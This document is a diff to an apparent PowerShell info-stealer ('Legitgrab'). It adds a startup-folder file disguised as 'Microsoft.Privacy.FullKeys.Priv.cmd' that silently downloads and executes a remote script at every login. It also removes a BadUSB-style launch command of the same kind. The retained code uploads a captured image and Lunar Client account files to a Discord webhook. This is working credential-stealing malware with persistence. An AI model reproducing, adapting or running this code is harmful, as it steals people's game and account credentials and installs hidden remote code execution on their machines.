@@ -1,9 +1,6 @@
-#Start command for your bad usb or idk
-#powershell $webHookUrl='"YOUR_WEBHOOK"';iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/gr.ps1).content)
-
-
-
 $webHookUrlPYTHON="'"+$webHookUrl+"'"
+$webHookUrl2="$"+"webHookUrl"
+
 New-Item "C:\temp" -Type Directory
 cls
 cd C:/temp
@@ -65,6 +62,13 @@ if __name__ == '__main__':
     
 "
 
+##### STARTUP FONCTION
+Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
+@echo off
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON;iex((iwr https://raw.githubusercontent.com/Appolon24800/Appolon-KIT-Public/main/g.ps1).content)
+"
+
+##### END STARTUP FONCTION
 
 cls
 
@@ -98,7 +102,7 @@ param (
 $Body = @{
   'content' = $text
 }
-cls
+
 
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $webHookUrl  -Method Post -Body ($Body | ConvertTo-Json)};
@@ -144,18 +148,21 @@ $payload = [PSCustomObject]@{
 }
 
 
-cls
+
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
 python C:\temp\UUID.py
 Upload-Discord -file "C:\temp\MicrosoftPolicy.png"
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 
 Upload-Discord -text "---------------------------------------------------------------------------------------------------------------------------------------------------------"
-Upload-Discord -text "||@everyone||"
-cls
-cd C:\Users\$env:UserName\
-Remove-Item C:\temp\MicrosoftPolicy.png -Recurse -Force -Confirm:$false
-Remove-Item C:\temp\UUID.py -Recurse -Force -Confirm:$false
-Remove-Item C:\temp\ -Recurse -Force -Confirm:$false
-cls
-exit
+Remove-Item C:/temp
+exit  
+
+  
+
+
+
+
+
+
+
